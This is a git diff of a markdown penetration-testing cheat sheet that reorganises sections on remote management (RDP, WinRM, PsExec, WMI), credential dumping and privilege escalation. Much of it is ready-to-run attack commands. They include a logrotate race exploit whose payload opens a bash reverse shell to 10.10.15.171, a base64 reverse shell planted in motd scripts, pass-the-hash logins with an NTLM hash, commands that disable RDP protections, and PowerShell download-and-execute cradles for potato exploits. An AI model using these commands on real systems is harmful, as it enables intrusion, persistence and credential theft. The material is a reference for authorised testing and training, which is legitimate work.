@@ -119,6 +119,12 @@ root@kali:$ {nc.tradentional|nc|ncat|netcat} [-6] -lvnp <LPORT>
 ```
 
 
+#### pwncat
+
+* [github.com/cytopia/pwncat](https://github.com/cytopia/pwncat)
+* [securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/](https://securixy.kz/hack-faq/pwncat-netcat-na-steroidah.html/)
+
+
 
 ### Upgrade to PTY
 
@@ -253,7 +259,7 @@ root@kali:$ impacket-smbserver -username snovvcrash -password 'Passw0rd!' -smb2s
 PS > $pass = 'Passw0rd!' | ConvertTo-SecureString -AsPlainText -Force
 PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $pass)
 Or
-PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $(ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force))
+PS > $cred = New-Object System.Management.Automation.PSCredential('snovvcrash', $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force))
 PS > New-PSDrive -name Z -root \\10.10.14.16\share -Credential $cred -PSProvider 'filesystem'
 PS > cd Z:
 ```
@@ -643,59 +649,6 @@ root@kali:$ samrdump.py 127.0.0.1
 
 
 
-### RDP
-
-* [syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
-* [swarm.ptsecurity.com/remote-desktop-services-shadowing/](https://swarm.ptsecurity.com/remote-desktop-services-shadowing/)
-
-
-#### Enable RDP
-
-Enable RDP from meterpreter:
-
-```
-meterpreter > run getgui -e
-```
-
-Enable RDP from PowerShell:
-
-```
-PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
-PS > Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
-```
-
-
-#### Restricted Admin
-
-* [https://www.kali.org/penetration-testing/passing-hash-remote-desktop/](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)
-* [https://blog.ahasayen.com/restricted-admin-mode-for-rdp/](https://blog.ahasayen.com/restricted-admin-mode-for-rdp/)
-* [https://labs.f-secure.com/blog/undisable/](https://labs.f-secure.com/blog/undisable/)
-* [https://shellz.club/pass-the-hash-with-rdp-in-2019/](https://shellz.club/pass-the-hash-with-rdp-in-2019/)
-
-RDP with [PtH](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/): RDP needs a plaintext password unless Restricted Admin mode is enabled.
-
-Enable Restricted Admin mode:
-
-```
-PS > Get-ChildItem -Recurse HKLM:\System\CurrentControlSet\Control\Lsa
-PS > Get-Item HKLM:\System\CurrentControlSet\Control\Lsa
-PS > New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin" -Value 0 -PropertyType "DWORD"
-PS > Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin"
-```
-
-
-#### NLA
-
-Disable NLA:
-
-```
-PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
-PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
-```
-
-
-
 ### Tricks
 
 List all domain users:
@@ -787,7 +740,137 @@ PS > robocopy /B W:\Windows\NTDS\ntds.dit C:\Users\snovvcrash\Documents\ntds.dit
 
 
 
-## Dump Creds
+## Remote Management
+
+* [eventlogxp.com/blog/logon-type-what-does-it-mean/](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)
+
+
+
+### RDP
+
+* [syfuhs.net/how-authentication-works-when-you-use-remote-desktop](https://syfuhs.net/how-authentication-works-when-you-use-remote-desktop)
+* [swarm.ptsecurity.com/remote-desktop-services-shadowing/](https://swarm.ptsecurity.com/remote-desktop-services-shadowing/)
+
+
+#### Enable RDP
+
+Enable RDP from meterpreter:
+
+```
+meterpreter > run getgui -e
+```
+
+Enable RDP from PowerShell:
+
+```
+PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+PS > Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+PS > Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
+```
+
+
+#### Restricted Admin
+
+* [https://www.kali.org/penetration-testing/passing-hash-remote-desktop/](https://www.kali.org/penetration-testing/passing-hash-remote-desktop/)
+* [https://blog.ahasayen.com/restricted-admin-mode-for-rdp/](https://blog.ahasayen.com/restricted-admin-mode-for-rdp/)
+* [https://labs.f-secure.com/blog/undisable/](https://labs.f-secure.com/blog/undisable/)
+* [https://shellz.club/pass-the-hash-with-rdp-in-2019/](https://shellz.club/pass-the-hash-with-rdp-in-2019/)
+
+RDP with [PtH](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/): RDP needs a plaintext password unless Restricted Admin mode is enabled.
+
+Enable Restricted Admin mode:
+
+```
+PS > Get-ChildItem -Recurse HKLM:\System\CurrentControlSet\Control\Lsa
+PS > Get-Item HKLM:\System\CurrentControlSet\Control\Lsa
+PS > New-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin" -Value 0 -PropertyType "DWORD"
+PS > Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name "DisableRestrictedAdmin"
+```
+
+
+#### NLA
+
+Disable NLA:
+
+```
+PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
+PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
+```
+
+
+#### Abusing CredSSP / TSPKG
+
+* [clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/](https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/)
+
+
+
+### runas /netonly
+
+```
+PS > runas /netonly /user:snovvcrash powershell
+```
+
+
+
+### WinRM / PSRemoting
+
+* [www.bloggingforlogging.com/2018/01/24/demystifying-winrm/](https://www.bloggingforlogging.com/2018/01/24/demystifying-winrm/)
+* [www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/](https://www.powershellmagazine.com/2014/03/06/accidental-sabotage-beware-of-credssp/)
+* [www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/network-vs-interactive-logons)
+
+
+#### evil-winrm.rb
+
+* [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
+* [malicious.link/post/2020/run-as-system-using-evil-winrm/](https://malicious.link/post/2020/run-as-system-using-evil-winrm/)
+
+Install:
+
+```
+$ git clone https://github.com/Hackplayers/evil-winrm ~/tools/evil-winrm
+$ cd ~/tools/evil-winrm && bundle install && cd -
+$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
+Or
+$ gem install evil-winrm
+```
+
+Run:
+
+```
+$ evil-winrm.rb -u snovvcrash -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
+```
+
+
+
+### SMB (PsExec)
+
+* [www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec](https://www.contextis.com/us/blog/lateral-movement-a-deep-look-into-psexec)
+
+#### psexec.py
+
+```
+root@kali:$ psexec.py snovvcrash:'Passw0rd!'@127.0.0.1
+root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
+```
+
+
+
+### WMI
+
+* [www.ethicalhacker.net/features/root/wmi-101-for-pentesters/](https://www.ethicalhacker.net/features/root/wmi-101-for-pentesters/)
+
+
+#### wmiexec.py
+
+```
+root@kali:$ wmiexec.py snovvcrash:'Passw0rd!'@127.0.0.1
+root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
+```
+
+
+
+
+## Dump Credentials
 
 
 
@@ -920,12 +1003,6 @@ Parse secrets:
 ```
 $ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds ntds.dit LOCAL
 ```
-
-
-
-### Abusing CredSSP / TSPKG
-
-* [clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/](https://clement.notin.org/blog/2019/07/03/credential-theft-without-admin-or-touching-lsass-with-kekeo-by-abusing-credssp-tspkg-rdp-sso/)
 
 
 
@@ -1578,7 +1655,9 @@ Socks5 proxy with Chisel in client mode:
 
 
 
-## Post Exploitation
+## LPE
+
+* [PayloadsAllTheThings/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 
 
@@ -1643,9 +1722,53 @@ user@vict:$ ./pspy
 * [0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485](https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485)
 
 
+#### Dirty COW
+
+* [dirtycow.ninja/](https://dirtycow.ninja/)
+* [github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
+* [github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
+
+
+#### logrotate
+
+whotwagner/logrotten:
+
+```
+$ curl https://github.com/whotwagner/logrotten/raw/master/logrotten.c > lr.c
+$ gcc lr.c -o lr
+
+$ cat payloadfile
+if [ `id -u` -eq 0 ]; then (bash -c 'bash -i >& /dev/tcp/10.10.15.171/9001 0>&1' &); fi
+
+$ ./lr -p ./payload -t /home/snovvcrash/backups/access.log -d
+```
+
+* [github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)
+* [tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
+* [tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
+* [popsul.ru/blog/2013/01/post-42.html](https://popsul.ru/blog/2013/01/post-42.html)
+
+
+#### motd
+
+`/etc/update-motd.d/`:
+
+```
+root@kali:$ shellpop --reverse --number 8 -H 127.0.0.1 -P 1337 --base64
+root@kali:$ echo '<BASE64_SHELL>' >> 00-header
+* Fire up new SSH session and catch the reverse shell
+```
+
+* [www.securityfocus.com/bid/50192/discuss](https://www.securityfocus.com/bid/50192/discuss)
+
+PAM MOTD:
+
+* [www.exploit-db.com/exploits/14273](https://www.exploit-db.com/exploits/14273)
+* [www.exploit-db.com/exploits/14339](https://www.exploit-db.com/exploits/14339)
+
+
 
 ### Windows
-
 
 #### Recon
 
@@ -1709,54 +1832,8 @@ Windows-Exploit-Suggester:
 * [github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 
 ```
-$ python -u windows-exploit-suggester.py -d 1970-01-01-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.log
+$ python -u windows-exploit-suggester.py -d 2020-09-02-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.log
 ```
-
-
-#### Remote Admin
-
-##### runas
-
-```
-PS > runas /netonly /user:snovvcrash powershell
-```
-
-##### evil-winrm.rb
-
-* [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
-* [malicious.link/post/2020/run-as-system-using-evil-winrm/](https://malicious.link/post/2020/run-as-system-using-evil-winrm/)
-
-Install:
-
-```
-$ git clone https://github.com/Hackplayers/evil-winrm ~/tools/evil-winrm
-$ cd ~/tools/evil-winrm && bundle install && cd -
-$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
-```
-
-Run:
-
-```
-$ evil-winrm.rb -u snovvcrash -p 'Passw0rd!' -i 127.0.0.1 -s `pwd` -e `pwd`
-```
-
-##### psexec.py
-
-```
-root@kali:$ psexec.py snovvcrash:'Passw0rd!'@127.0.0.1
-root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
-```
-
-* [github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py)
-
-##### wmiexec.py
-
-```
-root@kali:$ wmiexec.py snovvcrash:'Passw0rd!'@127.0.0.1
-root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
-```
-
-* [github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
 
 
 #### Registry & Filesystem
@@ -1780,96 +1857,11 @@ PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Inte
 * [security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/](https://security-tzu.com/2020/11/01/setobjectsecurity-exe-sddl/)
 
 
-
-
-
-## LPE
-
-* [PayloadsAllTheThings/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
-
-
-
-### Linux
-
-
-#### Dirty COW
-
-* [dirtycow.ninja/](https://dirtycow.ninja/)
-* [github.com/dirtycow/dirtycow.github.io/wiki/PoCs](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
-* [github.com/FireFart/dirtycow/blob/master/dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
-
-
-#### logrotate
-
-whotwagner/logrotten:
-
-```
-$ curl https://github.com/whotwagner/logrotten/raw/master/logrotten.c > lr.c
-$ gcc lr.c -o lr
-
-$ cat payloadfile
-if [ `id -u` -eq 0 ]; then (bash -c 'bash -i >& /dev/tcp/10.10.15.171/9001 0>&1' &); fi
-
-$ ./lr -p ./payload -t /home/snovvcrash/backups/access.log -d
-```
-
-* [github.com/whotwagner/logrotten](https://github.com/whotwagner/logrotten)
-* [tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges](https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges)
-* [tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
-* [popsul.ru/blog/2013/01/post-42.html](https://popsul.ru/blog/2013/01/post-42.html)
-
-
-#### motd
-
-`/etc/update-motd.d/`:
-
-```
-root@kali:$ shellpop --reverse --number 8 -H 127.0.0.1 -P 1337 --base64
-root@kali:$ echo '<BASE64_SHELL>' >> 00-header
-* Fire up new SSH session and catch the reverse shell
-```
-
-* [www.securityfocus.com/bid/50192/discuss](https://www.securityfocus.com/bid/50192/discuss)
-
-PAM MOTD:
-
-* [www.exploit-db.com/exploits/14273](https://www.exploit-db.com/exploits/14273)
-* [www.exploit-db.com/exploits/14339](https://www.exploit-db.com/exploits/14339)
-
-
-
-### Windows
-
-
-#### Windows-Exploit-Suggester
-
-* [github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
-
-```
-$ sudo python -m pip install xlrd
-$ python -u windows-exploit-suggester.py -d 2020-09-02-mssb.xls -i systeminfo.txt --ostext 'windows 10 64-bit' --hotfixes hotfixes.txt | tee wes.log
-```
-
-
-#### PowerShell
-
-Run as another user:
-
-```
-PS > $user = '<HOSTNAME>\<USERNAME>'
-PS > $pass = ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force
-PS > $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
-
-PS > Invoke-Command -ComputerName <HOSTNAME> -ScriptBlock { whoami } -Credential $cred
-Or
-PS > $s = New-PSSession -ComputerName <HOSTNAME> -Credential $cred
-PS > Invoke-Command -ScriptBlock { whoami } -Session $s
-```
-
-
 #### Potatoes
 
-foxglovesec/RottenPotato **[1]**, **[2]**:
+##### foxglovesec/RottenPotato
+
+* [foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
 
 ```
 meterpreter > upload [3]
@@ -1883,7 +1875,7 @@ meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
 2. [foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
 3. [github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe](https://github.com/foxglovesec/RottenPotato/raw/master/rottenpotato.exe)
 
-ohpe/juicy-potato **[1]**, **[2]**:
+##### ohpe/juicy-potato
 
 ```
 Cmd > certutil -urlcache -split -f http://127.0.0.1/[3] C:\Windows\System32\spool\drivers\color\j.exe
@@ -1903,6 +1895,10 @@ cmd /c powershell -NoP IEX (New-Object Net.WebClient).DownloadString('http://127
 3. [github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe)
 4. [github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
 
+##### decoder/the-lonely-potato
+
+* [decoder.cloud/2017/12/23/the-lonely-potato/](https://decoder.cloud/2017/12/23/the-lonely-potato/)
+
 
 #### wuauserv
 
@@ -1914,6 +1910,34 @@ PS > Start-Service wuauserv
 ...get reverse shell...
 PS > Get-Service wuauserv
 PS > Stop-Service wuauserv
+```
+
+
+#### Run as Another User
+
+##### PowerShell
+
+```
+PS > $cred = New-Object System.Management.Automation.PSCredential('<HOSTNAME>\<USERNAME>', $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force))
+```
+
+Invoke-Command with `-Credential`:
+
+```
+PS > Invoke-Command -ComputerName <HOSTNAME> -ScriptBlock { whoami } -Credential $cred
+```
+
+Invoke-Command with `-Session`:
+
+```
+PS > $s = New-PSSession -ComputerName <HOSTNAME> -Credential $cred
+PS > Invoke-Command -ScriptBlock { whoami } -Session $s
+```
+
+Start-Process with `-Credential`
+
+```
+PS > Start-Process -FilePath "cmd" -ArgumentList "/c ping -n 1 10.10.13.37" -Credential $cred
 ```
 
 
@@ -3768,6 +3792,29 @@ $ sudo vi /etc/resolv.conf
 $ ping 8.8.8.8
 $ nslookup ya.ru
 $ sudo systemctl enable ssh --now
+```
+
+### netplan
+
+`/etc/netplan/*.yaml`:
+
+```
+network:
+  version: 2
+  renderer: networkd
+  ethernets:
+    eth0:
+      addresses: [10.10.13.37/24]
+      gateway4: 10.10.13.1
+      dhcp4: true
+      optional: true
+      nameservers:
+        addresses: [8.8.8.8,8.8.4.4]
+```
+
+```
+$ sudo service NetworkManager stop
+$ sudo netplan apply
 ```
 
 
